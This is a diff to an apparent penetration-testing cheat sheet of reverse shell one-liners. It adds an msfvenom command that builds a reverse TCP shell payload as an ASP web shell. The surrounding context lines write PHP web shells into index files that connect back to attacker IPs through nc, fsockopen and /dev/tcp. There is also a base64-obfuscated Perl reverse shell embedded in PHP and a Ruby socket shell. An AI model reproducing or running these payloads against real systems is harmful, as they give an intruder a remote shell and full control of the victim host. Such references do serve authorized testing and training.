@@ -219,7 +219,10 @@ echo '<?php echo shell_exec(""/bin/nc -nvv 10.*.*.* 443 -e /bin/sh"") ?>' > inde
 echo '<?php $sock=fsockopen(""10.*.*.*"",443);exec(""/bin/sh -i <&3 >&3 1>&3"");?>' > index2.php
 echo '<?php echo shell_exec(""/bin/bash -i > /dev/tcp/10.11.0.42/443 0<&1 2>&1"");?>' > index3.php
 ```
-
+creating webshell with msfvenom
+```sh 
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.* LPORT=443  -f asp > shells.asp
+```
 
 **-Perl** <br />
 ```sh 
@@ -229,8 +232,8 @@ perl -e 'use Socket;$i="10.0.0.*";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotob
 Perl script base64 encoded inside php 
 ```sh 
 <?phpshell_exec(base64_decode("cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTEuMC4zNyI7JHA9MTIzNDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsn"))?>
-```
-
+``` 
+<br />
 **-Ruby** <br />
 ```sh 
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.*",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
